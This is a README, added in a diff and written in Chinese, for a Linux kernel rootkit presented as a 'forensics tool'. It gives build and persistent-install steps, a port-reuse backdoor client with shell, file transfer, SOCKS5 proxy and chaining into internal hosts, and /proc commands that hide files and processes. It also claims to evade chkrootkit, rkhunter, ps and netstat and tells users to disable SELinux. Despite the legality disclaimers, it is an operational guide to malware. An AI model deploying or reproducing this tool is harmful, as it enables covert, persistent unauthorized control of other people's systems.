@@ -1,0 +1,334 @@
+# Rootkit端口复用取证工具
+
+## 项目简介
+
+这是一个基于Linux内核模块的rootkit端口复用取证工具，具有很高的隐藏性和穿透连接功能。该工具使用rootkit内核级隐藏技术，能够隐藏运行在常见Linux系统中，并在内核层实现连接劫持，可以复用对外的端口去连接管理被控制的主机，通信行为隐藏于正常的流量之中。
+
+**重要声明**: 本工具仅用于合法的系统管理、安全测试和取证研究，严禁不合规使用，严禁对外传播。
+
+## 技术特点
+
+- **内核rootkit技术**: 采用rootkit内核技术，可以更深度的做到隐藏与保护，深度的利用开放的端口去控制被控主机，隐藏于正常流量中
+- **bin合并技术**: 把应用层程序加密编译到ko文件中，使用时自动解密释放并执行
+- **交互式pty shell**: 支持交互式pty shell，可以更方便的对主机进行远程操作
+- **内核级隐藏**: 在内核级隐藏了网络连接、进程、端口、文件信息，也可以自定义隐藏的文件和进程
+- **通信加密处理**: 复用端口，连接成功后网络的通信是经过数据加密的，保护通信的内容
+- **文件传输**: 提供对本地及远程的文件进行上传与下载操作
+- **代理功能**: 支持把本地的连接通过代理转发到被控主机网络，方便进行内部网络的操作
+
+## 系统兼容性
+
+### 支持的内核版本
+- Linux Kernel 2.6/3.x/4.x
+- 支持x32与x64系统
+
+### 支持的操作系统
+- Redhat, CentOS, Debian, Fedora, Ubuntu等Linux系统
+- 已测试: CENTOS 5.5 - 8 (kernel 5.18)
+- Ubuntu支持到kernel 5.14
+
+## 项目结构
+
+```
+rksrc_20230201/
+├── bin32/                    # 32位应用程序
+│   ├── client               # 客户端程序
+│   ├── server               # 服务端程序
+│   ├── encode               # 编码工具
+│   └── proxy                # 代理工具
+├── kofile/                   # 内核模块源码
+│   ├── main.c               # 主模块文件
+│   ├── config.h              # 配置文件
+│   └── ...                  # 其他模块文件
+├── install/                  # 安装脚本
+│   ├── install.sh           # 安装脚本
+│   ├── systemctl.sh         # systemctl安装脚本
+│   └── VMmisc.ko            # 编译好的内核模块
+├── bin32_centos5.2/         # CentOS 5.2兼容版本
+├── .tmp_versions/           # 临时版本文件
+└── Makefile                  # 编译配置文件
+```
+
+## 系统要求
+
+### 软件环境
+**重要**: 建议在安装系统时选择安装gcc相关包和内核开发包，避免手工下载安装出现意外情况。
+
+#### CentOS/RHEL
+```bash
+yum install gcc
+yum install glibc-static libstdc++-static
+yum install readline-devel
+yum install "kernel-devel-uname-r == $(uname -r)"
+```
+
+#### Ubuntu/Debian
+```bash
+apt-get install build-essential
+apt-get install gcc
+apt-get install libreadline6-dev
+apt-get install linux-headers-$(uname -r)
+```
+
+### 内核开发包安装
+由于Linux环境gcc、kernel版本繁多，最好只用系统安装盘里的开发环境包和kernel包，要与被安装机kernel版本一样。
+
+#### 手动安装内核包
+根据当前kernel版本下载对应包，可在 https://pkgs.org/ 查找下载：
+
+**CentOS**:
+```bash
+# 使用当前系统kernel版本编译
+yum install "kernel-devel-uname-r == $(uname -r)"
+
+# 手动下载安装
+# kernel-2.6.32-xx.1.el6.x86_64.rpm
+# kernel-devel-2.6.32-xx.1.el6.x86_64.rpm
+```
+
+**Ubuntu/Debian**:
+```bash
+# 搜索可用版本
+apt-cache search linux-headers-*
+
+# 安装指定版本
+apt-get install linux-headers-3.10.0-10
+```
+
+## 编译安装
+
+### 1. 编译内核模块
+
+```bash
+# 解压源码包
+tar -xvf rksrc.tar
+cd rksrc
+
+# 设置权限
+chmod -R +xwr *
+
+# 编译内核模块
+make
+
+# 清理编译文件
+make clean
+```
+
+**重要**: 每次在不同内核版本上使用时，需要重新编译ko文件。编译成功后会在`/rksrc/VMmisc.ko`生成内核模块。
+
+### 2. 测试内核模块
+```bash
+# 测试ko模块
+insmod VMmisc.ko
+
+# 注意: ko测试机重启系统后，ko模块就失效了
+# 无任何异常表示ko编译没问题，把ko复制到install里去安装就可以了
+```
+
+### 3. 安装部署
+
+#### 方法一: 使用install.sh (适用于传统init系统)
+```bash
+cd install
+chmod +x install.sh
+./install.sh
+```
+
+#### 方法二: 使用systemctl.sh (适用于systemd系统)
+```bash
+cd install
+chmod +x systemctl.sh
+./systemctl.sh
+```
+
+**说明**: Linux服务启动有两种方式，如果执行systemctl命令存在，用systemctl.sh安装；不存在使用install.sh安装。
+
+安装成功后，会显示以下信息：
+```
+>> ko path: /etc/xxxx
+>> start path: /etc/init.d/xxxx
+```
+
+**保存此信息用于删除操作**，最后删除安装包。
+
+## 配置说明
+
+### 修改连接密码
+编辑 `kofile/config.h` 文件:
+```c
+#define _START_PASS "testtest"  // 连接密码，可修改，不要使用特殊字符
+```
+
+**建议**: 使用字母数字组合，如: Test1234img
+
+## 使用方法
+
+### 客户端连接
+```bash
+./client <ip> <port> <password> [protocol]
+```
+
+示例:
+```bash
+./client 127.0.0.1 8080 testtest https
+```
+
+**连接密码**: testtest
+
+### 可用命令
+
+| 命令 | 功能 | 参数 | 说明 |
+|------|------|------|------|
+| `shell` | 启动PTY shell | 无 | 启动交互式shell |
+| `callrk` | 连接远程主机 | [ip:port pass] | 串联功能，通过边缘机器控制内网机器 |
+| `exitrk` | 退出当前连接 | 无 | 退出当前串联连接 |
+| `upload` | 上传文件 | [local_path remote_path] | 上传本地文件到远程 |
+| `download` | 下载文件 | [remote_path local_path] | 下载远程文件到本地 |
+| `socks5` | 启动SOCKS5代理 | [local_port] | 启动代理服务 |
+| `stopsk5` | 停止SOCKS5代理 | 无 | 停止代理服务 |
+| `exit` | 完全退出 | 无 | 完全退出程序 |
+
+**上下键**: 查看命令记录
+
+### 使用示例
+
+```bash
+# 串联连接（通过A控制B）
+callrk 127.0.0.1:22 pass
+
+# 退出当前串联
+exitrk
+
+# 启动SOCKS5代理
+socks5 5555
+
+# 关闭代理
+stopsk5
+
+# 上传文件
+upload /tmp/6666 /tmp/7777
+
+# 下载文件
+download /tmp/6666 /tmp/8888
+
+# 启动shell
+shell
+
+# 退出shell
+exit
+```
+
+### 内核模块控制
+
+```bash
+# 隐藏文件/目录 222
+echo "+f222" > /proc/VMmisc
+
+# 显示文件/目录 222
+echo "-f222" > /proc/VMmisc
+
+# 隐藏进程 666
+echo "+p666" > /proc/VMmisc
+
+# 显示进程 666
+echo "-p666" > /proc/VMmisc
+```
+
+## 特殊功能
+
+### 串联功能
+如控制边缘机器A，通过A转发给内网机器B，从而实现了通过A能控制B。通过端口转发，A B两台服务器同时植入后门，可通过A转发到B的控制端口。连接器连接A转发出来的端口，从而连接到B。
+
+**已实现完成**
+
+### 兼容性改进
+- 兼容CENTOS 5.6.7 (必要)，8(非必要)
+- Ubuntu (16-22) 兼容越多越好(暂时非必要)
+- 已测试: CENTOS 5.5 - 8 (kernel 5.18)
+- Ubuntu支持到kernel 5.14
+
+## 故障排除
+
+### SELinux相关问题
+如果系统启用了SELinux，在shell时执行systemctl命令有权限检查，需要先临时关闭SELinux：
+```bash
+# 关闭SELinux
+setenforce 0
+
+# 启用SELinux
+setenforce 1
+```
+
+### 内核版本兼容性
+确保安装的内核开发包版本与当前运行的内核版本一致：
+```bash
+# 查看当前内核版本
+uname -r
+
+# 安装对应版本的内核开发包
+yum install "kernel-devel-uname-r == $(uname -r)"
+```
+
+## 卸载说明
+
+### 方法一: 手动卸载
+```bash
+# 关闭内核模块隐藏
+echo "dm" > /proc/VMmisc
+rmmod VMmisc.ko
+
+# 删除安装文件（使用安装时保存的路径）
+rm -rf /etc/xxxx
+rm -rf /etc/init.d/xxxx
+```
+
+### 方法二: systemctl卸载
+```bash
+# 关闭内核模块隐藏
+echo "dm" > /proc/VMmisc
+rmmod VMmisc.ko
+
+# 删除安装文件
+rm -rf /etc/xxxx
+rm -rf /etc/systemd/system/xxxx.service
+```
+
+## 安全注意事项
+
+⚠️ **重要提醒**:
+- 此工具仅用于合法的系统管理、安全测试和取证研究
+- 严禁不合规使用，严禁对外传播
+- 请确保在授权环境下使用
+- 使用完毕后请及时卸载相关组件
+- 请遵守当地法律法规
+- 对chkrootkit、rkhunter、管理工具(ps,netstat等)都做了技术绕过与隐藏
+- 为保证软件稳定性，各功能也经过压力测试
+
+## 技术绕过说明
+
+本工具对以下检测工具做了技术绕过与隐藏：
+- chkrootkit
+- rkhunter
+- 管理工具(ps, netstat等)
+
+这些工具都查看不到被隐藏的网络、端口、进程、文件信息。
+
+## 技术支持
+
+如遇到问题，请检查:
+1. 系统兼容性
+2. 内核版本匹配
+3. 依赖包安装
+4. 权限设置
+5. 编译环境配置
+
+## 许可证
+
+本项目仅供学习和研究使用，请勿用于非法用途。
+
+---
+
+**最后更新**: 2023年2月1日  
+**版本**: 1.0  
+**技术类型**: Rootkit内核级隐藏技术  
+**适用场景**: 系统管理、安全测试、取证研究
